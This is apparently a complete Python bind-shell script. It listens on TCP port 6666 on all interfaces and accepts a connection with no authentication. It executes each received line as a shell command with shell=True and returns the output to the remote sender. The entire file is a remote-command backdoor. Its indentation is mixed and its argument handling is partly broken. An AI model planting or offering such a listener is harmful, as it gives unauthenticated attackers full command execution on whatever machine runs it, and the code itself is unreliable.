import socket, subprocess, platform

addr = ""
port = 6666


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((addr, port))
s.listen(1)

connection, address = s.accept()
connection.send("hello".encode())

while True:
	try:
		data = connection.recv(1024)
		data = data.decode('utf-8')
		print(data)
		data = data.split(" ")
		command_response = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		command_response = str(command_response.stdout.read()) + " " + str(command_response.stderr.read())
		connection.send(command_response.encode())
	except KeyboardInterrupt:
        	continue
